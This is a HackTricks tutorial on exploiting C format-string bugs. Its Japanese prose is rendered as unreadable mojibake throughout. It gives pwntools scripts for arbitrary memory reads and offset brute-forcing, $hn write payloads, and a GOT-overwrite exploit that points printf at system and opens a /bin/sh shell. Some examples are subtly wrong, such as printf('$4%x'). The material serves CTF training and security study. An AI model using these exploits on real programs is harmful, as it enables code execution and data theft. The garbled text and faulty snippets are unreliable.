# ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚’é€šã˜ã¦ã€ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã¾ã—ã‚‡ã†</strong></a><strong>ï¼</strong></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ã¦ã¿ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚§ã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„**ã€‚

</details>

## åŸºæœ¬æƒ…å ±

Cè¨€èªã§ã¯ã€**`printf`**ã¯æ–‡å­—åˆ—ã‚’**è¡¨ç¤º**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹é–¢æ•°ã§ã™ã€‚ã“ã®é–¢æ•°ãŒæœŸå¾…ã™ã‚‹**æœ€åˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã¯ã€**ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ã‚’å«ã‚€ç”Ÿã®ãƒ†ã‚­ã‚¹ãƒˆ**ã§ã™ã€‚æœŸå¾…ã•ã‚Œã‚‹**æ¬¡ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã¯ã€ç”Ÿã®ãƒ†ã‚­ã‚¹ãƒˆã‹ã‚‰**ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ã‚’ç½®æ›ã™ã‚‹å€¤**ã§ã™ã€‚

ä»–ã®è„†å¼±ãªé–¢æ•°ã«ã¯**`sprintf()`**ã¨**`fprintf()`**ãŒã‚ã‚Šã¾ã™ã€‚

è„†å¼±æ€§ãŒç™ºç”Ÿã™ã‚‹ã®ã¯ã€ã“ã®é–¢æ•°ã®**æœ€åˆã®å¼•æ•°ã¨ã—ã¦æ”»æ’ƒè€…ã®ãƒ†ã‚­ã‚¹ãƒˆ**ãŒä½¿ç”¨ã•ã‚ŒãŸå ´åˆã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€**printfãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨**ã—ã¦ã€**ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆèª­ã¿å–ã‚Šå¯èƒ½/æ›¸ãè¾¼ã¿å¯èƒ½ï¼‰ã®ãƒ‡ãƒ¼ã‚¿ã‚’èª­ã¿å–ã‚ŠãŠã‚ˆã³æ›¸ãè¾¼ã¿**ã™ã‚‹**ç‰¹åˆ¥ãªå…¥åŠ›**ã‚’ä½œæˆã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

#### ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ï¼š
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%p â€”> Pointer
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**ä¾‹:**

* è„†å¼±æ€§ã®ã‚ã‚‹ä¾‹:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* é€šå¸¸ã®ä½¿ç”¨æ–¹æ³•:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* ä¸è¶³ã—ã¦ã„ã‚‹å¼•æ•°ã‚’ä½¿ç”¨ã—ãŸå ´åˆ:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
* fprintf è„†å¼±æ€§:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input cna include formatters!
fclose(output_file);
return 0;
}
```
### **ãƒã‚¤ãƒ³ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**

ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆ**`%<n>$x`**ã¯ã€`n`ãŒæ•°å­—ã§ã‚ã‚‹å ´åˆã€printfã«nç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ï¼‰ã‚’é¸æŠã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€printfã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰4ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’èª­ã¿å–ã‚ŠãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™:
```c
printf("%x %x %x %x")
```
ãã—ã¦ã€æœ€åˆã‹ã‚‰4ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¾ã§èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã¯ã€æ¬¡ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```c
printf("$4%x")
```
ãã—ã¦ã€4ç•ªç›®ã‚’ç›´æ¥èª­ã¿å–ã‚Šã¾ã™ã€‚

æ”»æ’ƒè€…ãŒ`pr`**`intf`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚** ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€`printf`ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã¨ãã«ã‚¹ã‚¿ãƒƒã‚¯ã«å½¼ã®å…¥åŠ›ãŒã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã€ã¤ã¾ã‚Šã€å½¼ã¯ã‚¹ã‚¿ãƒƒã‚¯ã«ç‰¹å®šã®ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="danger" %}
ã“ã®å…¥åŠ›ã‚’åˆ¶å¾¡ã™ã‚‹æ”»æ’ƒè€…ã¯ã€**ã‚¹ã‚¿ãƒƒã‚¯ã«ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¿½åŠ ã—ã€`printf`ãŒãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ã“ã®å‹•ä½œã®ä½¿ç”¨æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚
{% endhint %}

## **ä»»æ„ã®èª­ã¿å–ã‚Š**

ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿**`%n$s`**ã‚’ä½¿ç”¨ã—ã¦ã€**`printf`**ãŒ**nç•ªç›®ã«ã‚ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’å–å¾—ã—ã€ãã‚Œã«ç¶šã„ã¦**æ–‡å­—åˆ—ã¨ã—ã¦å‡ºåŠ›**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆ0x00ãŒè¦‹ã¤ã‹ã‚‹ã¾ã§å‡ºåŠ›ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€ãƒã‚¤ãƒŠãƒªã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒ**`0x8048000`**ã§ã‚ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãŒã‚¹ã‚¿ãƒƒã‚¯ã®4ç•ªç›®ã®ä½ç½®ã‹ã‚‰å§‹ã¾ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆã€ãƒã‚¤ãƒŠãƒªã®å…ˆé ­ã‚’æ¬¡ã®ã‚ˆã†ã«å‡ºåŠ›ã§ãã¾ã™ï¼š
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
ã‚¢ãƒ‰ãƒ¬ã‚¹0x8048000ã‚’å…¥åŠ›ã®å…ˆé ­ã«ç½®ãã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æœ«å°¾ã«ã¯0x00ãŒé€£çµã•ã‚Œã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### ã‚ªãƒ•ã‚»ãƒƒãƒˆã®æ¤œç´¢

å…¥åŠ›ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€4ãƒã‚¤ãƒˆã¾ãŸã¯8ãƒã‚¤ãƒˆï¼ˆ`0x41414141`ï¼‰ã‚’é€ä¿¡ã—ã€**`%1$x`** ã«ç¶šã‘ã¦å€¤ã‚’**å¢—ã‚„ã—ã¦**ã„ãã€`A's` ã‚’å–å¾—ã—ã¾ã™ã€‚

<details>

<summary>Brute Force printf offset</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### æœ‰ç”¨æ€§

ä»»æ„èª­ã¿å–ã‚Šã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å½¹ç«‹ã¤ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼š

- ãƒ¡ãƒ¢ãƒªã‹ã‚‰**ãƒã‚¤ãƒŠãƒª**ã‚’**ãƒ€ãƒ³ãƒ—**ã™ã‚‹
- ã‚­ãƒ£ãƒŠãƒªãƒ¼ã€æš—å·ã‚­ãƒ¼ã€ã¾ãŸã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã©ã®**æ©Ÿå¯†æƒ…å ±ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹ãƒ¡ãƒ¢ãƒªã®ç‰¹å®šã®éƒ¨åˆ†ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ï¼ˆã“ã®[**CTFãƒãƒ£ãƒ¬ãƒ³ã‚¸**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value)ã§ã®ã‚ˆã†ã«ï¼‰

## **ä»»æ„æ›¸ãè¾¼ã¿**

ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ **`$<num>%n`** ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã®\<num>ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§æŒ‡å®šã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã«**æ›¸ãè¾¼ã¾ã‚ŒãŸãƒã‚¤ãƒˆæ•°**ã‚’æ›¸ãè¾¼ã¿ã¾ã™ã€‚æ”»æ’ƒè€…ãŒprintfã§å¥½ããªã ã‘æ–‡å­—ã‚’æ›¸ãè¾¼ã‚ã‚‹å ´åˆã€**`$<num>%n`** ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®æ•°å€¤ã‚’ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚

å¹¸ã„ãªã“ã¨ã«ã€æ•°å€¤9999ã‚’æ›¸ãè¾¼ã‚€ã«ã¯ã€å…¥åŠ›ã«9999å€‹ã®"A"ã‚’è¿½åŠ ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãã®ãŸã‚ã«ã¯ã€ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ **`%.<num-write>%<num>$n`** ã‚’ä½¿ç”¨ã—ã¦ã€**`num`ã®ä½ç½®ã§æŒ‡å®šã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ•°å€¤`<num-write>`**ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
ã—ã‹ã—ãªãŒã‚‰ã€é€šå¸¸ã€`0x08049724` ã®ã‚ˆã†ãªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ããŸã‚ã«ï¼ˆã“ã‚Œã¯ä¸€åº¦ã«æ›¸ãã«ã¯å·¨å¤§ãªæ•°ã§ã™ï¼‰ã€**`$n`** ã®ä»£ã‚ã‚Šã« **`$hn`** ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**2 ãƒã‚¤ãƒˆã ã‘ã‚’æ›¸ã**ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®æ“ä½œã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ä¸Šä½ 2 ãƒã‚¤ãƒˆã¨ä¸‹ä½ 2 ãƒã‚¤ãƒˆã®ä¸¡æ–¹ã«å¯¾ã—ã¦ 2 å›è¡Œã‚ã‚Œã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€**ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒå¯èƒ½**ã§ã™ã€‚

ã“ã®ä¾‹ã§ã¯ã€å¾Œã§å‘¼ã³å‡ºã•ã‚Œã‚‹ **GOT ãƒ†ãƒ¼ãƒ–ãƒ«**å†…ã® **é–¢æ•°**ã® **ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’ **ä¸Šæ›¸ã** ã™ã‚‹ã“ã¨ãŒç›®æ¨™ã¨ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šä»–ã®ä»»æ„ã®æ›¸ãè¾¼ã¿ã‚’å®Ÿè¡Œã™ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’æ‚ªç”¨ã§ãã¾ã™:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‹ã‚‰ **å¼•æ•°**ã‚’ **å—ã‘å–ã‚‹é–¢æ•°**ã® **ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’ **`system` é–¢æ•°**ã« **ãƒã‚¤ãƒ³ãƒˆ** ã•ã›ã¾ã™ã€‚\
å‰è¿°ã®ã‚ˆã†ã«ã€ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã«ã¯é€šå¸¸ 2 ã‚¹ãƒ†ãƒƒãƒ—ãŒå¿…è¦ã§ã™: ã¾ãšã€ã‚¢ãƒ‰ãƒ¬ã‚¹ã® 2 ãƒã‚¤ãƒˆã‚’æ›¸ãè¾¼ã¿ã€ãã®å¾Œæ®‹ã‚Šã® 2 ãƒã‚¤ãƒˆã‚’æ›¸ãè¾¼ã¿ã¾ã™ã€‚ã“ã‚Œã«ã¯ **`$hn`** ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

* **HOB** ã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ä¸Šä½ 2 ãƒã‚¤ãƒˆã‚’æŒ‡ã—ã¾ã™
* **LOB** ã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ä¸‹ä½ 2 ãƒã‚¤ãƒˆã‚’æŒ‡ã—ã¾ã™

ãã®å¾Œã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®å‹•ä½œã«ã‚ˆã‚Šã€\[HOBã€LOB] ã®ã†ã¡ **å°ã•ã„æ–¹ã‚’æœ€åˆã«æ›¸ãè¾¼ã‚€** å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

HOB < LOB ã®å ´åˆ\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOB ã®å ´åˆ\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntoolsã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ

ã“ã®ç¨®ã®è„†å¼±æ€§ã«å¯¾ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æº–å‚™ã™ã‚‹ãŸã‚ã®**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ**ã‚’ä»¥ä¸‹ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

ã¾ãŸã¯ã€[**ã“ã¡ã‚‰**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)ã‹ã‚‰ã®åŸºæœ¬çš„ãªä¾‹:
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## ãƒã‚¤ãƒŠãƒªã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã¸ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—

ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®è„†å¼±æ€§ã®æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã—ã¦ã€**ã‚¹ã‚¿ãƒƒã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãè¾¼ã¿**ã€**ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼**ã‚¿ã‚¤ãƒ—ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32ãƒ“ãƒƒãƒˆã€relroãªã—ã€canaryãªã—ã€nxã€pieãªã—ã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ãƒ•ãƒ©ã‚°ã‚’ãƒªãƒ¼ã‚¯ã™ã‚‹åŸºæœ¬çš„ãªä½¿ç”¨ä¾‹ï¼ˆå®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã‚’å¤‰æ›´ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32ãƒ“ãƒƒãƒˆã€relroã€canaryãªã—ã€nxã€pieãªã—ã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã‚’ä½¿ç”¨ã—ã¦`fflush`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’winé–¢æ•°ï¼ˆret2winï¼‰ã§ä¸Šæ›¸ãã™ã‚‹
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32ãƒ“ãƒƒãƒˆã€relroã€canaryãªã—ã€nxã€pieãªã—ã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã‚’ä½¿ç”¨ã—ã¦ã€`.fini_array`å†…ã®mainå†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã¿ï¼ˆãƒ•ãƒ­ãƒ¼ãŒ1å›è¿½åŠ ã§ãƒ«ãƒ¼ãƒ—ã™ã‚‹ï¼‰ã€`system`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’`strlen`ã‚’æŒ‡ã™GOTãƒ†ãƒ¼ãƒ–ãƒ«ã«æ›¸ãè¾¼ã¿ã¾ã™ã€‚ãƒ•ãƒ­ãƒ¼ãŒmainã«æˆ»ã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã§`strlen`ãŒå®Ÿè¡Œã•ã‚Œã€`system`ã‚’æŒ‡ã™ã‚ˆã†ã«ãªã‚Šã€æ¸¡ã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
